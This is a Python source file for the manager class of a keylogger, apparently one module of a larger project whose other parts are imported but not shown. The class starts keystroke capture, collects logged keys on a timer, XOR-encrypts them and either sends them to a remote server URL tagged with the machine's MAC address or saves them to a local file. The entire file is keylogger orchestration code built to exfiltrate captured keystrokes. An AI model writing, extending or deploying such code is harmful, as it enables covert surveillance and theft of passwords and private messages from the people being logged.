from key_logger_service import KeyLoggerService
from network_writer import NetworkWriter
from file_writer import FileWriter
from xor_encryptor import XorEncryptor
from time import sleep


class KeyLoggerManager:
    """Managing the software with the help of auxiliary files."""

    def __init__(self, timer: int, mac_address, encryption_key: str | int, write_to: list[str], url: str = None):
        """Receive a timer for data entry requests."""
        self.running = False
        self.timer = timer
        self.mac_address = mac_address
        self.logger = KeyLoggerService()
        self.encryption_key = encryption_key
        self.encryptor = XorEncryptor()
        self.writers = self._get_writers(write_to, url)

    @staticmethod
    def _get_writers(write_to: list[str], url: str) -> list:
        """Returns a list of writer classes (inheriting from the same interface) based on user selection."""
        writers = []
        if "server" in write_to:
            if not url:
                raise ValueError("URL is required when write_to includes 'server'.")
            writers.append(NetworkWriter(url))
        if "file" in write_to:
            writers.append(FileWriter())
        if not writers:
            raise ValueError("At least one valid write option ('server' or 'file') must be specified.")
        return writers

    def start(self):
        """Starts the logging and runs the necessary files."""
        self.running = True
        self.logger.start_logging()  # Start logging
        while self.running:
            sleep(self.timer)  # Wait based on the defined interval
            get_logger = self.logger.get_logged_keys()  # Get the data
            if get_logger:  # If there were key presses
                logger_encrypt = self.encryptor.encrypt(get_logger, self.encryption_key)  # Encrypt
                for writer in self.writers:
                    if isinstance(writer, NetworkWriter):
                        writer.send_data(logger_encrypt, self.mac_address())  # Send to server
                    elif isinstance(writer, FileWriter):
                        writer.send_data(logger_encrypt, 'Key logger.txt')  # Save to file

    def stop(self):
        """Stops the logging."""
        self.running = False
        self.logger.stop_logging()
